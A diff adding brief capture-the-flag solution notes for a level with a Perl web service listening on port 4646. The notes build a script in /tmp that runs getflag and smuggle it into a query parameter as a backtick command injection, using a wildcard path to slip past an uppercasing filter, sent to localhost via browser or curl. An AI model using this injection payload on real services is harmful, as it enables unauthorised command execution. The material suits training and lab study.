@@ -1,0 +1,14 @@
+perl file : listen on 4646, take 2 args
+the regex filter the FILE in maj so we create :
+$ touch /tmp/CCC
+!#/bin/bash
+getflag > /tmp/gg
+$ chmod +x /tmp/CCC
+
+browser --> localhost:4646/?x=`/*/CCC`&y=hh
+
+or term :
+curl "localhost:4646/?x=%60%2F*%2FCCC%60&y=hh"
+
+$ cat /tmp/gg
+g1qK[...]
